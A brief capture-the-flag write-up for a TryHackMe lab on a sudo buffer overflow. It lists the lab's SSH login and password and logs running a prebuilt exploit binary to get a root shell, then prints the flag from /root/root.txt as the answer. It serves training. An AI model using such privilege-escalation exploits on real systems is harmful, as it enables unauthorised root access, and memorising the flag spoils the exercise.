# Sudo Buffer Overflow | https://tryhackme.com/room/sudovulnsbof

### [Task 2] Buffer Overflow

ssh -p 4444 tryhackme@10.10.164.254
Password : tryhackme 

```
ssh -p 4444 tryhackme@10.10.164.254
tryhackme@10.10.164.254's password: 
Last login: Thu Jun 18 03:30:09 2020 from 10.9.18.54
tryhackme@sudo-bof:~$ ls
exploit
tryhackme@sudo-bof:~$ ./exploit 
[sudo] password for tryhackme: 
Sorry, try again.
# 
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),1000(tryhackme)
# cat /root/root.txt
THM{buff3r_0v3rfl0w_rul3s}
```

#2	What's the flag in /root/root.txt? : `THM{buff3r_0v3rfl0w_rul3s}`
